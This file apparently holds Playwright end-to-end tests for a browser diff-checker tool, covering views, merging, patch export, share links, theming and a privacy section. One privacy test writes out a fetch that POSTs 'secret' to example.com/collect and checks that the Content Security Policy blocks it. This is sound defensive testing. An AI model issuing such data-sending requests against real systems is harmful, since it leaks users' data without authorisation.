import { expect, test } from '@playwright/test';
import { CHANGED, ORIGINAL, editorText, fillEditors, trackErrors, trackOutgoing } from './helpers';

test.describe('toolspace', () => {
  test('loads without errors', async ({ page }) => {
    const errors = trackErrors(page);
    await page.goto('/diff-checker/');
    await expect(page).toHaveTitle(/^Diff checker - compare text and code, free \| toolspace$/);
    await expect(page.getByRole('heading', { level: 1 })).toHaveText('Diff checker');
    expect(errors).toEqual([]);
  });

  test('shows counts and switches between split and unified views', async ({ page }) => {
    await page.goto('/diff-checker/');
    await fillEditors(page, ORIGINAL, CHANGED);
    const summary = page.getByLabel('Change summary');
    await expect(summary).toContainText('+2');
    await expect(summary).toContainText('−2');
    await expect(page.locator('table.diff-table.split')).toBeVisible();

    await page.getByRole('radio', { name: 'Unified' }).click();
    await expect(page.locator('table.diff-table.unified')).toBeVisible();
    await expect(page.locator('table.diff-table.unified td.prefix', { hasText: '+' })).toHaveCount(2);
  });

  test('merges a line across and undoes it', async ({ page }) => {
    await page.goto('/diff-checker/');
    await fillEditors(page, ORIGINAL, CHANGED);
    await page.getByRole('button', { name: /of a to b/ }).first().click();
    await expect.poll(() => editorText(page, 'Changed text')).toMatch(/^function total\(items\) \{/);

    await page.getByRole('button', { name: 'Undo' }).click();
    await expect.poll(() => editorText(page, 'Changed text')).toBe(CHANGED);
  });

  test('ignores whitespace when asked', async ({ page }) => {
    await page.goto('/diff-checker/');
    await fillEditors(page, 'a  b\nc\n', 'a b\nc\n');
    await expect(page.getByText('a and b are identical')).toHaveCount(0);
    await page.getByLabel('Ignore whitespace').click();
    await expect(page.getByText('a and b are identical')).toBeVisible();
  });

  test('highlights changes inside the editors', async ({ page }) => {
    await page.goto('/diff-checker/');
    await fillEditors(page, ORIGINAL, CHANGED);
    await page.getByRole('radio', { name: 'Highlight changes in the editors' }).click();
    await expect(page.locator('.cm-line.cm-diff-add')).toHaveCount(2);
    await expect(page.locator('.cm-line.cm-diff-del')).toHaveCount(2);
    await expect(page.locator('.cm-gutterElement.cm-gutter-add')).toHaveCount(2);
    await expect(page.locator('.cm-line.cm-diff-add .inline-added').first()).toBeVisible();
    await expect(page.locator('.diff-scroll')).toHaveCount(0);
  });

  test('downloads a .patch that describes the change', async ({ page }) => {
    await page.goto('/diff-checker/');
    await fillEditors(page, ORIGINAL, CHANGED);
    await page.getByRole('button', { name: 'Export' }).click();
    const [download] = await Promise.all([
      page.waitForEvent('download'),
      page.getByRole('menuitem', { name: 'Download .patch' }).click(),
    ]);
    const stream = await download.createReadStream();
    let text = '';
    for await (const chunk of stream) text += chunk;
    expect(text).toContain('--- a/original');
    expect(text).toContain('@@ -1,5 +1,5 @@');
    expect(text).toContain('+function total(items, tax) {');
  });

  test('share links restore both texts from the URL fragment', async ({ page, context }) => {
    await context.grantPermissions(['clipboard-read', 'clipboard-write']);
    await page.goto('/diff-checker/');
    await fillEditors(page, ORIGINAL, CHANGED);
    await page.getByRole('button', { name: 'Share' }).click();
    await expect(page).toHaveURL(/#.+/);
    const url = page.url();
    expect(await page.evaluate(() => navigator.clipboard.readText())).toBe(url);

    const fresh = await context.newPage();
    await fresh.goto(url);
    await expect.poll(() => editorText(fresh, 'Original text')).toBe(ORIGINAL);
    await expect.poll(() => editorText(fresh, 'Changed text')).toBe(CHANGED);
  });

  test('marks a missing final newline like git', async ({ page }) => {
    await page.goto('/diff-checker/');
    await fillEditors(page, 'a\nb', 'a\nb\n');
    const marker = page.locator('.diff-table .no-eol');
    await expect(marker).toHaveCount(1);
    await expect(marker).toHaveText('\\ No newline at end of file');
    // In unified view it sits on the removed line (a), not the added one
    await page.getByRole('radio', { name: 'Unified' }).click();
    await expect(page.locator('.diff-table.unified td.is-del .no-eol')).toHaveCount(1);
    await expect(page.locator('.diff-table.unified td.is-add .no-eol')).toHaveCount(0);
    // In-editor mode says it in a note
    await page.getByRole('radio', { name: 'Highlight changes in the editors' }).click();
    await expect(page.getByText('\\ No newline at end of file in a')).toBeVisible();
  });

  test('finds text anywhere in the diff', async ({ page }) => {
    await page.goto('/diff-checker/');
    await fillEditors(page, ORIGINAL, CHANGED);
    await page.getByLabel('Find in diff').fill('SUM');
    await expect(page.getByText('1/3')).toBeVisible(); // 3 diff lines mention sum
    await expect(page.locator('.find-hit').first()).toBeVisible();
    await page.getByLabel('Find in diff').press('Enter');
    await expect(page.getByText('2/3')).toBeVisible();
    await page.getByLabel('Find in diff').fill('no such text');
    await expect(page.getByText('no matches')).toBeVisible();
  });

  test('one switch flips the theme, remembers it, and goes back to following the system', async ({ page }) => {
    await page.emulateMedia({ colorScheme: 'light' });
    await page.goto('/diff-checker/');
    await expect(page.locator('html')).toHaveAttribute('data-theme', 'light');
    await page.getByRole('button', { name: 'Switch to dark theme' }).click();
    await expect(page.locator('html')).toHaveAttribute('data-theme', 'dark');
    await page.reload();
    await expect(page.locator('html')).toHaveAttribute('data-theme', 'dark');
    // Back to light, which is what the system wants: it follows the system again
    await page.getByRole('button', { name: 'Switch to light theme' }).click();
    expect(await page.evaluate(() => localStorage.getItem('toolspace-theme'))).toBeNull();
    await page.emulateMedia({ colorScheme: 'dark' });
    await expect(page.locator('html')).toHaveAttribute('data-theme', 'dark');
  });
});

test.describe('privacy', () => {
  test('ships a Content Security Policy that blocks network requests', async ({ page }) => {
    await page.goto('/diff-checker/');
    const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
    expect(csp).toContain("connect-src 'none'");
    expect(csp).toContain("default-src 'none'");
  });

  test('makes no network requests while diffing', async ({ page }) => {
    await page.goto('/diff-checker/', { waitUntil: 'networkidle' });
    const requests = trackOutgoing(page);

    await fillEditors(page, ORIGINAL, CHANGED);
    await page.getByRole('radio', { name: 'Unified' }).click();
    await page.getByRole('radio', { name: 'Highlight changes in the editors' }).click();
    await page.getByRole('button', { name: 'Summary' }).click();
    await page.mouse.wheel(0, 20_000); // scroll through the rest of the page
    await page.waitForTimeout(500);

    expect(requests).toEqual([]);
  });

  test('blocks a script that tries to send data out', async ({ page }) => {
    await page.goto('/diff-checker/');
    const result = await page.evaluate(() =>
      fetch('https://example.com/collect', { method: 'POST', body: 'secret' }).then(
        () => 'sent',
        () => 'blocked',
      ),
    );
    expect(result).toBe('blocked');
  });

  // Known gap: there is no service worker yet, so a reload without a connection fails.
  test.fixme('keeps working after an offline reload', async ({ page, context }) => {
    await page.goto('/diff-checker/', { waitUntil: 'networkidle' });
    await context.setOffline(true);
    await page.reload();
    await expect(page).toHaveTitle(/^Diff checker - compare text and code, free \| toolspace$/);
  });
});
